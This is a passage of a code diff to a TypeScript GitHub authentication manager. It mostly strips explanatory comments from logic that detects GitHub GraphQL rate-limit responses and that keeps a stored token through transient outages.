-   * with `errors[].type === "RATE_LIMITED" | "SECONDARY_RATE_LIMITED"`) as
-   * failure and returns `null`. Without the body-level check, GitHub's
-   * common 200 OK + `{"data":{"repository":{"pullRequests":{"nodes":[]}}}}`
-   * + RATE_LIMITED errors response would look identical to "no PRs," which
-   * (in the poller's case) wrongly promotes every tracked session to merged.
-   *
-   * Permanently logs non-2xx and 200-with-errors at `warn` so prod logs
-   * surface this class of failure without per-incident instrumentation.
-   */
   async graphqlQuery<T = unknown>(query: string, variables?: Record<string, unknown>): Promise<T | null> {
     if (!this._token) return null;
 
@@ -1039,12 +642,7 @@ export class GitHubAuthManager extends EventEmitter {
     const retryAfterHeader = res.headers.get("retry-after");
 
     const remaining = remainingHeader !== null ? Number.parseInt(remainingHeader, 10) : null;
-    // `x-ratelimit-reset` is a UNIX timestamp in seconds; convert to ms.
     const resetFromHeader = resetHeader !== null ? Number.parseInt(resetHeader, 10) * 1000 : null;
-    // `retry-after` is either seconds-from-now or an HTTP date; we only
-    // honor the seconds form (what GitHub actually sends for the abuse
-    // limit) and skip the date case rather than carrying a tiny RFC1123
-    // parser.
     const retryAfterMs = retryAfterHeader !== null && /^\d+$/.test(retryAfterHeader)
       ? Number.parseInt(retryAfterHeader, 10) * 1000
       : null;
@@ -1064,13 +662,10 @@ export class GitHubAuthManager extends EventEmitter {
         `[github-auth] graphqlQuery non-2xx: status=${res.status} remaining=${remaining ?? "?"} ` +
         `reset=${resetFromHeader ?? "?"} retryAfter=${retryAfterMs ?? "?"} requestId=${requestId ?? "?"} body=${truncated}`,
       );
-      // 403 is GitHub's abuse-limit signal; 429 is the formal rate-limit.
       if (res.status === 403 || res.status === 429) {
         const resetAt = retryAfterMs !== null ? Date.now() + retryAfterMs : resetFromHeader;
         updateState({ limited: true, resetAt, remaining });
       } else {
-        // Other non-2xx responses don't speak to the rate-limit state; only
-        // refresh the remaining/reset trackers if the headers were present.
         if (remaining !== null || resetFromHeader !== null) {
           updateState({ limited: this._rateLimit.limited, resetAt: this._rateLimit.resetAt, remaining });
         }
@@ -1085,12 +680,6 @@ export class GitHubAuthManager extends EventEmitter {
     }
 
     const errors = body.errors ?? [];
-    // GitHub's GraphQL rate-limit errors come in several shapes — the primary
-    // budget produces `{type:"RATE_LIMIT", code:"graphql_rate_limit"}` (singular,
-    // confusingly), while abuse detection produces `RATE_LIMITED` /
-    // `SECONDARY_RATE_LIMITED`. Match all of them, and fall back to the `code`
-    // field as a belt-and-braces signal in case GitHub introduces yet another
-    // type label.
     const rateLimited = errors.some((e) =>
       e.type === "RATE_LIMIT" ||
       e.type === "RATE_LIMITED" ||
@@ -1107,40 +696,25 @@ export class GitHubAuthManager extends EventEmitter {
     }
 
     if (errors.length > 0) {
-      // Non-rate-limit GraphQL errors — log so prod can see what's failing
-      // without flipping rate-limit state.
       console.warn(
         `[github-auth] graphqlQuery 200 with errors: requestId=${requestId ?? "?"} errors=${JSON.stringify(errors)}`,
       );
     }
 
-    // Clean response — clear any prior rate-limit state and refresh trackers.
     updateState({ limited: false, resetAt: null, remaining });
     return body as T;
   }
 
-  /**
-   * Load cached user info from GitHub API using stored token.
-   * Called on startup when checkCredentials() finds a token file.
-   */
   async loadUserInfo(): Promise<void> {
     if (!this._token) return;
     const check = await checkGitHubToken(this._token);
     if (check.status === "valid") {
       this._username = check.user.username;
       this._avatarUrl = check.user.avatarUrl;
-      // Restore global git identity from GitHub profile
       this.setGitIdentityFromGitHub(check.user);
     } else if (check.status === "invalid") {
-      // GitHub explicitly rejected the token (401) — it's genuinely dead, so
-      // clear it.
       this.clearCredentials();
     } else {
-      // Indeterminate (5xx / rate-limit / network error / GitHub outage). We
-      // can't confirm the token is bad, and clearing it on boot during an
-      // outage would log the user out for an external incident. Keep the
-      // stored token; profile fields stay unpopulated until a later check
-      // succeeds. Only the user may clear their token implicitly.
       console.warn(
         `[github-auth] Could not verify stored GitHub token on load (${check.detail}); ` +
           `keeping credentials (likely a transient GitHub outage)`,
